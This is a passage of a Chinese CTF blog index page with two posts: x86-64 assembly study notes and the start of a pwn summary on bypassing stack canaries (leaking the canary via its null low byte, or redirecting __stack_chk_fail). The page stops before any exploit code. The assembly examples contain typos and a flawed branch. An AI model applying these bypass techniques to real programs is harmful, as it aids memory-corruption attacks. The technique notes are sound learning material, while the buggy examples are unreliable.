<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"maple-pwn.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="Maple">
<meta property="og:url" content="http://maple-pwn.github.io/page/4/index.html">
<meta property="og:site_name" content="Maple">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Maple">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://maple-pwn.github.io/page/4/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/4/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Maple</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Maple</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Maple’s Blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Maple</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basic/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basic/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-17 00:07:44" itemprop="dateModified" datetime="2025-02-17T00:07:44+08:00">2025-02-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="汇编速通"><a href="#汇编速通" class="headerlink" title="汇编速通"></a>汇编速通</h1><p>by Maple</p>
<h2 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h2><p>机器级编程，两种抽象比较重要</p>
<ol>
<li>第一种是由指令集体系结构或指令集架构（Instruction Set Architecture，ISA）来定义机器级程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响。</li>
<li>第二种是机器级程序使用的内存地址是虚拟地址，提供的内存模型看上去是一个非常大的<strong>字节</strong>数组。</li>
</ol>
<p><em>以上不重要</em></p>
<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><p>Intel 用术语“字（word）”表示 16 位数据类型，称 32 位数为“双字（double words）”，称 64 位数为“四字（quad words）”。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220704191537496.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-1 C 语言数据类型在 x86-64 中的大小。在 64 位机器中，指针长 8 字节</td>
</tr>
</tbody></table>
<p>如上图所示，大多数 GCC 生成的汇编代码指令都有一个字符的后缀，表明操作数的大小。例如，数据传送指令有四个变种：<code>movb</code>（传送字节）、<code>movw</code>（传送字）、<code>movl</code>（传送双字）和 <code>movq</code>（传送四字）。注意，汇编代码也使用后缀 <code>l</code> 来表示 4 字节整数和 8 字节双精度浮点数。这不会产生歧义，因为<strong>浮点数使用的是一组完全不同的指令和寄存器</strong>。</p>
<h2 id="信息访问⭐"><a href="#信息访问⭐" class="headerlink" title="信息访问⭐"></a>信息访问⭐</h2><p>一个 x86-64 的中央处理单元（CPU）包含一组 16 个存储 64 位值的通用目的寄存器，这些寄存器用来存储整数数据和指针。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220704192557175.png" alt="image-20220704192557175"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-2 整数寄存器</td>
</tr>
</tbody></table>
<p>指令可以对这 16 个寄存器的低位字节中存放的不同大小的数据进行操作。</p>
<h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h3><p>大多数指令有一个或多个操作数（operand），指示出执行一个操作中要使用的源数据值，以及放置结果的目的位置。源数据值可以以常数形式给出，或是从寄存器或内存中读出。结果可以存放在寄存器或内存中。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220704194524240.png" alt="image-20220704194524240"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-3 操作数格式。<strong>比例因子 <code>s</code> 必须是 1、2、4 或者 8</strong>。</td>
</tr>
</tbody></table>
<p>地址计算的练习</p>
<table>
<thead>
<tr>
<th><img src="/./images/add-computation-example.jpg" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
</tr>
</tbody></table>
<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p><code>mov</code> 类指令把数据从源位置<strong>复制</strong>到目的位置，不做任何变化。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220704194834339.png" alt="image-20220704194834339"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-4 简单的数据传送指令</td>
</tr>
</tbody></table>
<p>x86-64 加了一条限制，传送指令的两个操作数不能都指向内存位置。将一个值从一个内存位置复制到另一个内存位置需要两条指令：第一条指令将源值加载到寄存器中，第二条将该寄存器值写入目的位置。</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">exchange</span> <span class="params">(<span class="type">long</span> *xp, <span class="type">long</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> x = *xp;</span><br><span class="line">    *xp = y;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gcc -og exchange exchange.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.long exchange (long *xp, long y)</span><br><span class="line">.xp in %rdi, y in %rsi</span><br><span class="line">exchange:</span><br><span class="line">	movq	(%rdi), %rax	将xp赋值给x，然后作为返回值</span><br><span class="line">	movq	%rsi, (%rdi)	将y存储在xp中</span><br><span class="line">	ret						返回</span><br></pre></td></tr></table></figure>

<h3 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h3><table>
<thead>
<tr>
<th><img src="/./images/image-20220828200248791.png" alt="image-20220828200248791"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-8 入栈和出栈指令</td>
</tr>
</tbody></table>
<p><code>pushq</code> 和 <code>popq</code> 指令都只有一个操作数：压入的数据源和弹出的数据目的。</p>
<p>将一个四字值压入栈中，首先要将栈指针（栈指针 <code>%rsp</code> 保存着栈顶元素的地址）减 8，然后将值写到新的栈顶地址。在 x86-64 中，栈向低地址方向增长，所以压栈是减小栈指针（寄存器 <code>%rsp</code>）的值，并将数据存放到内存中，而出栈是从内存中读数据，并增加栈指针的值。</p>
<p>无论如何，<code>%rsp</code> 指向的地址总是栈顶。</p>
<h2 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h2><p><strong>源在前，目的地在后</strong></p>
<p>下图这些操作被分为四组：加载有效地址、一元操作、二元操作和移位。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220705193103548.png" alt="image-20220705193103548"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-10 整数算术操作。<strong>注意：ATT 格式的汇编代码中，操作数的顺序与直觉相反</strong>。</td>
</tr>
</tbody></table>
<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">arith</span> <span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> t1 = x + y;</span><br><span class="line">    <span class="type">long</span> t2 = z + t1;</span><br><span class="line">    <span class="type">long</span> t3 = x + <span class="number">4</span>;</span><br><span class="line">    <span class="type">long</span> t4 = y * <span class="number">48</span>;</span><br><span class="line">    <span class="type">long</span> t5 = t3 + t4;</span><br><span class="line">    <span class="type">long</span> rval = t2 * t5;</span><br><span class="line">    <span class="keyword">return</span> raval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.x in %rdi, y in %rsi, z in %rdx, t1、t2、rval in %rax, t4 in %rdx, t5 in %rcx</span><br><span class="line">arith:</span><br><span class="line">	leaq	(%rdi, %rsi), %rax		;t1 = x + y</span><br><span class="line">	addq	%rdx, %rax				;t2 = z + t1</span><br><span class="line">	leaq	(%rsi, %rsi, 2), %rdx	;t4 = y+y*2 =&gt; t4 = 3*y</span><br><span class="line">	salq 	$4, %rdx				;t4&lt;&lt;4 =&gt; t4*=16</span><br><span class="line">									;加在一起就是t4 = y*48</span><br><span class="line">	leaq	4(%rdi, %rdx), %rcx		;t5 = 4 + x + t4</span><br><span class="line">	imulq	%rcx, %rax				;rval*=t5</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<h3 id="加载有效地址leaq"><a href="#加载有效地址leaq" class="headerlink" title="加载有效地址leaq"></a>加载有效地址<code>leaq</code></h3><p>加载有效地址（load effective address）指令 <code>leaq</code> 实际上是 <code>movq</code> 指令的变形，<strong>它的第一个操作数将有效地址写入到目的操作数</strong>。<strong>目的操作数必须是一个寄存器</strong>。</p>
<h3 id="特殊的算数操作"><a href="#特殊的算数操作" class="headerlink" title="特殊的算数操作"></a>特殊的算数操作</h3><p>x86-64 指令集对 128 位（16 字节）数的操作提供有限的支持。延续字（2 字节）、双字（4 字节）和四字（8 字节）的命名惯例，Intel 把 16 字节的数称为八字（oct word）。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220705194040325.png" alt="image-20220705194040325"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-12 特殊的算术操作。一对寄存器 <code>%rdx</code> 和 <code>%rax</code> 组成一个 128 位的八字</td>
</tr>
</tbody></table>
<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>机器代码提供两种基本的低级机制来实现有条件的行为：测试数据值，然后根据测试的结果来改变控制流或者数据流。</p>
<h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p>除了整数寄存器，CPU 还维护着一组单个位的条件码（condition code）寄存器。</p>
<p>最常用的条件码有：</p>
<ul>
<li>CF：进位标志。最近的操作使最高位产生了进位，可用来检查无符号操作的溢出。</li>
<li>ZF：零标志。最近的操作得出的结果为 0。</li>
<li>SF：符号标志。最近的操作得到的结果为负数。</li>
<li>OF：溢出标志。最近的操作导致一个补码溢出，正溢出或负溢出。</li>
</ul>
<p><code>leaq</code> 指令不改变任何条件码，它是用来进行地址计算的，<strong>除此之外</strong>，图 3-10中列出的所有指令都会设置条件码。还有两类指令，它们只设置条件码而不改变任何其他寄存器，如下图所示：</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220705195332940.png" alt="image-20220705195332940"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-13 比较和测试指令。这些指令不修改任何寄存器的值，只设置条件码</td>
</tr>
</tbody></table>
<h3 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h3><table>
<thead>
<tr>
<th><img src="/./images/image-20220902201422665.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-14 <code>SET</code> 指令</td>
</tr>
</tbody></table>
<p>某些底层的机器指令可能有多个名字，称之为“同义名（synonym）”。例如，<code>setg</code>（表示“设置大于”）和 <code>setnle</code>（表示“设置不小于等于”）指的就是同一条机器指令，编译器和反汇编器会随意决定使用哪个名字。</p>
<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>类似于<code>goto</code>代码</p>
<p>考虑下面的汇编代码序列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  movq $0,%rax	; Set %rax to 0</span><br><span class="line">  jmp .L1	; Goto .L1</span><br><span class="line">  movq (%rax),%rdx	; Null pointer dereference (skipped)</span><br><span class="line">.L1:</span><br><span class="line">  popq %rdx  ; Jump target</span><br></pre></td></tr></table></figure>

<p>指令 <code>jmp .L1</code> 会导致程序跳过 <code>movq</code> 指令，而从 <code>popq</code> 指令开始继续执行。</p>
<p>在产生目标代码文件时，汇编器会确定所有带标号指令的地址，并将跳转目标（目的指令的地址）编码为跳转指令的一部分。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220705195602494.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-15 <code>jump</code> 指令</td>
</tr>
</tbody></table>
<h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> lt_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> ge_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">absdiff_se</span> <span class="params">(<span class="type">long</span> x, <span class="type">long</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; y)</span><br><span class="line">    &#123;</span><br><span class="line">        lt_cnt++;</span><br><span class="line">        result = y-x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        gc_cnt++;</span><br><span class="line">        result = x-y;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.long absdiff_se (long x, long y)</span><br><span class="line">.x in %rdi, y in %rsi</span><br><span class="line">absdidd_se:</span><br><span class="line">	cmpq	%rsi, %rdi			;比较x:y</span><br><span class="line">	jge		.L2					;如果x&gt;=y，跳转到L2处</span><br><span class="line">	addq	$1, lt_cnt(%rip)	;lt_cnt++</span><br><span class="line">    movq	%rsi, %rax			;result = y</span><br><span class="line">    subq	%rdi, %rax			;result-=x;</span><br><span class="line">.L2:</span><br><span class="line">	addq	$1,ge_cnt(%rip)		;gd_cnt++</span><br><span class="line">	movq	%rdi, %rax</span><br><span class="line">	subq	%rsi, %rax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>其实和判断是一样的，goto回循环开头</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p><code>switch</code>（开关）语句可以根据一个<strong>整数索引值</strong>进行多重分支（multiway branching），在处理具有多种可能结果的测试时，这种语句特别有用。通过使用跳转表（jump table）这种数据结构使得实现。</p>
<p>使用跳转表的优点是执行开关语句的时间与开关情况的数量无关。GCC 根据开关情况的数量和开关情况值的稀疏程度来翻译开关语句，当开关情况数量比较多（例如 4 个以上），并且值的范围跨度比较小时，就会使用跳转表。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220905144239732.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-22 <code>switch</code> 语句示例以及翻译到扩展的 C 语言。 该翻译给出了跳转表 <code>jt</code> 的结构，以及如何访问它。作为对 C 语言的扩展，GCC 支持这样的表。</td>
</tr>
<tr>
<td><img src="/./images/image-20220905144652985.png" alt="img"></td>
</tr>
<tr>
<td>上图 <code>switch</code> 语句示例的汇编代码</td>
</tr>
<tr>
<td><img src="/./images/image-20220905145814013.png" alt="image-20220905145814013"></td>
</tr>
<tr>
<td>在汇编代码中，跳转表用上述声明表示</td>
</tr>
</tbody></table>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>假设</strong>过程 <code>P</code> 调用过程 <code>Q</code>，<code>Q</code> 执行后返回到 <code>P</code>。这些动作包括下面一个或多个机制：</p>
<ul>
<li>传递控制。在进入过程 <code>Q</code> 的时候，程序计数器必须被设置为 <code>Q</code> 的代码的起始地址，然后在返回时，要把程序计数器设置为 <code>P</code> 中调用 <code>Q</code> 后面那条指令的地址。</li>
<li>传递数据。<code>P</code> 必须能够向 <code>Q</code> 提供一个或多个参数，<code>Q</code> 必须能够向 <code>P</code> 返回一个值。</li>
<li>分配和释放内存。在开始时，<code>Q</code> 可能需要为局部变量分配空间，而在返回前，又必须释放这些存储空间。</li>
</ul>
<h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p>C 语言过程调用机制的一个关键特性（大多数其他语言也是如此）在于使用了栈数据结构提供的后进先出的内存管理原则。程序可以用栈来管理它的过程所需要的存储空间，栈和程序寄存器存放着传递控制和数据、分配内存所需要的信息。</p>
<p>将栈指针（<code>%rsp</code>）减小一个适当的量可以为没有指定初始值的数据在栈上分配空间，类似地，可以通过增加栈指针来释放空间。</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220706195512876.png" alt="image-20220706195512876"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-25 通用的栈帧结构</td>
</tr>
</tbody></table>
<p>当 x86-64 过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这个部分称为过程的栈帧（stack frame）。</p>
<p>通过寄存器，过程 <code>P</code> 可以传递最多 6 个整数值（也就是指针和整数），但是如果 <code>Q</code> 需要更多的参数，<code>P</code> 可以在调用 <code>Q</code> 之前在自己的栈帧里存储好这些参数。</p>
<h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p>x86-64 中，可以通过寄存器最多传递 6 个整型（整数和指针）参数。寄存器的使用是<strong>有特殊顺序的</strong>，寄存器使用的名字取决于要传递的数据类型的大小，如下图所示：</p>
<table>
<thead>
<tr>
<th><img src="/./images/image-20220706200736910.png" alt="image-20220706200736910"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-28 传递函数参数的寄存器。寄存器是按照特殊顺序来使用的，而使用的名字是根据参数的大小来确定的</td>
</tr>
</tbody></table>
<p>会根据参数在参数列表中的顺序为它们分配寄存器，可以通过 64 位寄存器适当的部分访问小于 64 位的参数。例如，如果第一个参数是 32 位的，那么可以用 <code>%edi</code> 来访问它。</p>
<p>如果一个函数有大于 6 个整型参数，超出 6 个的部分就要通过栈来传递。通过栈传递参数时，所有的数据大小都向 8 的倍数对齐。</p>
<h2 id="数组分配与访问"><a href="#数组分配与访问" class="headerlink" title="数组分配与访问"></a>数组分配与访问</h2><p>略</p>
<h2 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h2><p>就是<code>struct</code>、<code>union</code>这样子的数据结构</p>
<p>略</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basic/Canary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basic/Canary/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-21 14:53:37" itemprop="dateModified" datetime="2025-02-21T14:53:37+08:00">2025-02-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="总结1"><a href="#总结1" class="headerlink" title="总结1"></a>总结1</h1><p>by Maple</p>
<p>写了这么久的题了，但是看到题还是一头雾水，完全在瞎碰，写个小总结，系统整理整理吧</p>
<p><strong>从保护开始</strong></p>
<h2 id="1-Canary"><a href="#1-Canary" class="headerlink" title="1. Canary"></a>1. Canary</h2><h3 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h3><p>Canary就是在栈底放一个随机数，如果缓冲区变量溢出，那么这个随机数也会被篡改，当函数结束的时候会对这个随机数检查，如果发现这个随机数变了，就会执行<code>_stack_chk_fail</code>函数终止程序</p>
<p>从汇编角度看：函数序言会向保存调用函数的栈底指针，然后设置被调用函数自身的栈底指针，最后分配栈空间，这3条汇编指令标志着一个经典的函数序言</p>
<blockquote>
<p> 比如<code>buuctf</code>中的<code>bjdctf_2020_babyrop2</code>，有开启Canary保护，就存在这样的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     rax, fs:28h</span><br></pre></td></tr></table></figure></blockquote>
<p>但是Canary的非即时检测就留下了一定的操作空间：</p>
<p>只要可以让Canary在函数未结束前泄露出来，构造payload时在它本应在的位置写上Canary就可以了</p>
<p>所以问题就变为了如何泄露出来Canary，了解一下Canary随机值的特点</p>
<p>（或者修改指向<code>_stack_chk_fail</code>的地址，让函数走向后门函数）</p>
<ul>
<li><p>一般Canary会在<code>ebp-0x8</code>处存储，</p>
</li>
<li><p>其最低位设置为<code>\x00</code></p>
<blockquote>
<p> 这里本意时为了保证字符串可以被<code>\x00</code>截断，从而保护其它字节信息</p>
</blockquote>
</li>
</ul>
<h3 id="1-2绕过思路"><a href="#1-2绕过思路" class="headerlink" title="1.2绕过思路"></a>1.2绕过思路</h3><h4 id="1-2-1-覆盖截断获取随机值"><a href="#1-2-1-覆盖截断获取随机值" class="headerlink" title="1.2.1 覆盖截断获取随机值"></a>1.2.1 覆盖截断获取随机值</h4><p>先填充缓冲区变量到Canary的最低字节，然后获取泄露的Canary，最后根据Canary的值填充<code>rbp-0x8</code>的位置，此后调用函数栈指针可以随意覆盖</p>
<p>假设有一个题目这样布局</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>

<p>可以这样覆盖并泄露</p>
